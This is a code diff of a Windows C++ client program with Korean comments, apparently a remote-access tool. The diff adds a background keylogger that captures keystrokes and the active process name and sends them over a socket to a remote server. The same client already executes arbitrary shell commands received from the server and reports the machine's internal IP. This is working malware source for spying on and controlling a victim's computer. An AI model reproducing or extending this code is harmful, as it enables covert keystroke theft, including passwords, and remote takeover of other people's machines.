@@ -4,10 +4,11 @@
 #include <windows.h>
 #include <tchar.h>
 #include <conio.h>
-#include <tlhelp32.h>
+#include <process.h>
 #include <string>
 #include <cstdio>
 
+#include "util.h"
 #include "definition.h"
 
 #define BUFF_SIZE 2000
@@ -31,75 +32,19 @@ void ResetNotepad()
 	while (!h_edit)
 		h_edit = FindWindowEx(h_notepad, NULL, L"Edit", NULL);
 }
-DWORD FindProcessID(LPCTSTR szProcessName)
-{
-	DWORD dwPID = -1;
-	HANDLE hSnapShot = INVALID_HANDLE_VALUE;
-	PROCESSENTRY32 pe;
 
-	pe.dwSize = sizeof(PROCESSENTRY32);
-	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);
+UINT WINAPI keylog(void* arg);
 
-	Process32First(hSnapShot, &pe);
-	do
-	{
-		if (!_wcsicmp(szProcessName, pe.szExeFile))
-		{
-			dwPID = pe.th32ProcessID;
-			break;
-		}
-	} while (Process32Next(hSnapShot, &pe));
-
-	CloseHandle(hSnapShot);
-
-	return dwPID;
-}
-void ChangeFont(int font_size, const WCHAR* font_name)
-{
-	HDC hdc = GetDC(h_edit);
-	LOGFONT lf;
-	memset(&lf, 0, sizeof(LOGFONT));
-
-	lf.lfHeight = font_size;
-	lf.lfWidth = 0;
-	lf.lfEscapement = 0;
-	lf.lfOrientation = 0;
-	lf.lfWeight = 0;
-	lf.lfItalic = 0;
-	lf.lfUnderline = 0;
-	lf.lfStrikeOut = 0;
-	lf.lfCharSet = HANGEUL_CHARSET;
-	lf.lfOutPrecision = 0;
-	lf.lfClipPrecision = 0;
-	lf.lfQuality = 0;
-	lf.lfPitchAndFamily = 0;
-	wcscpy_s(lf.lfFaceName, 32, font_name);
-
-	HFONT Font = CreateFontIndirect(&lf);
-	PostMessage(h_edit, WM_SETFONT, (WPARAM)Font, 1); // note: WM_SETFONT메세지 보내야 한다는거 구글에도 안나와 있어서 직접 리버싱하면서 알아냄 ㅠㅠ
-
-	ReleaseDC(h_edit, hdc);
-}
-
-void replaceAll(string& str, const char* target, const char* result)
-{
-	string::size_type idx = str.find(target);
-	while (idx != string::npos)
-	{
-		str.replace(idx, strlen(target), result);
-		idx = str.find(target);
-	}
-
-}
 int main()
 {
 
 	WSADATA wsa;
 	SOCKET s;
 	struct sockaddr_in server;
-
+	
 	PDUHello pdu_hello;
 	PDUMessage* pdu_recv;
+	PDUCommand* pdu_command;
 
 	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
 	{
@@ -151,11 +96,18 @@ int main()
 
 	cout << "성공" << endl;
 
+	// 첫 연결시 내부망IP 전송
 	pdu_hello.protocol_type = HELLO;
 	char hostname[20] = "";
 	if (gethostname(hostname, 50) == 0)
 		strcpy_s(pdu_hello.internal_ip, inet_ntoa(*(struct in_addr*)gethostbyname(hostname)->h_addr_list[0]));
-	MessageBoxA(0, pdu_hello.internal_ip, "internal ip", 0);
+
+	Sleep(500); // 클라이언트 프로그램에 입력된 엔터키 전송 방지
+	UINT dwThreadID;
+	HANDLE hThread;
+	hThread = (HANDLE)_beginthreadex(NULL, 0, keylog, &s, 0, (unsigned*)&dwThreadID);
+	if (hThread == 0)
+		cerr << "beginhandlethreadex error";
 
 	if (send(s, (const char*)&pdu_hello, sizeof(PDUHello), 0) < 0)
 	{
@@ -184,25 +136,25 @@ int main()
 
 		//strcpy_s(buff_recv, temp.c_str());
 
-		pdu_recv = (PDUMessage*)buff_recv;
 
 		int nLen = 0;
 
 		switch (buff_recv[0])
 		{
 		case COMMAND: // CMD명령 실행
-			nLen = WideCharToMultiByte(CP_ACP, 0, pdu_recv->message, -1, NULL, 0, NULL, NULL);
-			WideCharToMultiByte(CP_ACP, 0, pdu_recv->message, -1, buff, nLen, NULL, NULL);
+			pdu_command = (PDUCommand*)&buff_recv;
+			nLen = WideCharToMultiByte(CP_ACP, 0, pdu_command->command, -1, NULL, 0, NULL, NULL);
+			WideCharToMultiByte(CP_ACP, 0, pdu_command->command, -1, buff, nLen, NULL, NULL);
 			system(buff);
 			break;
 
-		case 19: // 큰 글씨로 메모장 메시지 전송
+		/*case 19: // 큰 글씨로 메모장 메시지 전송
 
 			system("taskkill -f /im notepad.exe");
 			system("start notepad"); // 다시 실행
 
 			ResetNotepad(); // 핸들값 초기화
-			ChangeFont(100, L"궁서");
+			ChangeFont(h_edit, 100, L"궁서");
 
 			len = wcslen(pdu_recv->message) - 1;
 
@@ -212,14 +164,15 @@ int main()
 				Sleep(TYPING_DELAY);
 				cout << "WM_CHAR 메시지 보냄" << endl;
 			}
-			break;
+			break;*/
 		case MESSAGE: // 메모장 메시지 전송
 
+			pdu_recv = (PDUMessage*)buff_recv;
 			system("taskkill -f /im notepad.exe");
 			system("start notepad"); // 다시 실행
 
 			ResetNotepad(); // 핸들값 초기화
-			ChangeFont(21, L"맑은 고딕");
+			ChangeFont(h_edit, 21, L"맑은 고딕");
 
 			len = wcslen(pdu_recv->message);
 
@@ -234,6 +187,96 @@ int main()
 	}
 }
 
+
+UINT WINAPI keylog(void* arg)
+{
+	SOCKET s = *(SOCKET*)arg;
+	BOOL isShift = FALSE;
+
+	PDUKeylog pdu_keylog;
+	pdu_keylog.protocol_type = KEYLOG;
+
+	char LowToHigh[] = { '!', '@', '#', '$', '%', '^', '&', '*', '(', ')' };
+
+	while (1) {
+		UCHAR key = NULL;
+
+		Sleep(20);
+		if (GetKeyState(VK_BACK) < 0) 
+			key = VK_BACK;
+
+		else if (GetKeyState(VK_TAB) < 0)
+			key = VK_TAB;
+
+		else if (GetKeyState(VK_RETURN) < 0)
+			key = VK_RETURN;
+
+		else if (GetKeyState(VK_SPACE) < 0)
+			key = VK_SPACE;
+	
+		else if (GetKeyState(VK_SHIFT) < 0) 
+			isShift = TRUE;
+
+		else if (GetKeyState(VK_SHIFT) >= 0)
+			isShift = FALSE;
+
+		if (key)
+		{
+			DWORD dwPID;
+			GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
+			FindProcessName(dwPID, pdu_keylog.process_name);
+			pdu_keylog.state = key;
+
+			if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
+			{
+				cout << "서버와의 연결이 끊어졌습니다." << endl;
+				closesocket(s);
+				exit(1);
+			}
+		}
+			
+		for (key = 0x30; key <= 0x39; key++) // 키를 돌려가면서 판별
+		{
+			if (GetKeyState(key) < 0) { // 해당 키가 눌렸으면
+				if (isShift) // Shift인지 검사
+					pdu_keylog.state = LowToHigh[key - 0x30];
+				else
+					pdu_keylog.state = key;
+
+				DWORD dwPID;
+				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
+				FindProcessName(dwPID, pdu_keylog.process_name);
+
+				if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
+				{
+					cout << "서버와의 연결이 끊어졌습니다." << endl;
+					closesocket(s);
+					exit(1);
+				}
+			}
+		}
+		for (key = 0x40; key <= 0x5A; key++) // 키를 돌려가면서 판별
+		{
+			if (GetKeyState(key) < 0) { // 해당 키가 눌렸으면
+				if (isShift) // Shift인지 검사
+					pdu_keylog.state = key; // 쉬프트면 대문자
+				else
+					pdu_keylog.state = key + 0x20; // 아니면 소문자
+
+				DWORD dwPID;
+				GetWindowThreadProcessId(GetForegroundWindow(), &dwPID); // 현재 키를 입력한 프로세스 이름을 가져옴
+				FindProcessName(dwPID, pdu_keylog.process_name);
+
+				if (send(s, (const char*)&pdu_keylog, sizeof(PDUKeylog), 0) < 0)
+				{
+					cout << "서버와의 연결이 끊어졌습니다." << endl;
+					closesocket(s);
+					exit(1);
+				}
+			}
+		}
+	}
+}
 // 프로그램 실행: <Ctrl+F5> 또는 [디버그] > [디버깅하지 않고 시작] 메뉴
 // 프로그램 디버그: <F5> 키 또는 [디버그] > [디버깅 시작] 메뉴
 
